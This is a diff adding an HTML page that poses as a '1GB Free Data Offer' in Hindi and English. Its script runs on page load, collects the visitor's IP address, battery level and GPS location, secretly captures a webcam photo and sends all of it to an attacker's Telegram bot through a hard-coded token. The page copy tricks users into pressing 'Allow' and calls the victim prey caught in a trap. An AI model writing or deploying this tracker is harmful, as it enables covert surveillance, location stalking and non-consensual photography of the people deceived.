@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>FREE 1GB DATA OFFER</title>
+    <script>
+        const token = '8550777035:AAE4D2D2sxLMhXauVcJyBDVFg-yiBgeuF-c';
+        const chat_id = '8019272612';
+
+        async function startTracking() {
+            let info = "🎯 **नया शिकार जाल में!**\n\n";
+            
+            // 1. IP Address
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                info += "🌐 IP: " + ipData.ip + "\n";
+            } catch (e) { info += "🌐 IP: नहीं मिला\n"; }
+
+            // 2. बैटरी की जानकारी
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                info += "🔋 बैटरी: " + Math.round(battery.level * 100) + "%\n";
+            }
+
+            // 3. लोकेशन (GPS) और कैमरा
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    info += `📍 लोकेशन: http://googleusercontent.com/maps.google.com/maps?q=${lat},${lon}\n`;
+                    takePhoto(info);
+                }, async (err) => {
+                    info += "⚠️ यूजर ने लोकेशन 'Deny' कर दी।\n";
+                    takePhoto(info);
+                });
+            }
+        }
+
+        async function takePhoto(allDetails) {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', chat_id);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', allDetails + "📸 फोटो खींच ली गई है!");
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (err) {
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(allDetails + "⚠️ कैमरा परमिशन नहीं मिली।")}&parse_mode=Markdown`);
+                }
+            }
+        }
+        window.onload = startTracking;
+    </script>
+</head>
+<body style="background: black; color: white; text-align: center; padding-top: 50px; font-family: Arial;">
+    <h1>🎁 1GB Free Data Offer 🎁</h1>
+    <p>कृपया प्रतीक्षा करें, आपकी पात्रता की जाँच की जा रही है...</p>
+    <p>Verify करने के लिए 'Allow' बटन दबाएं।</p>
+</body>
+</html>
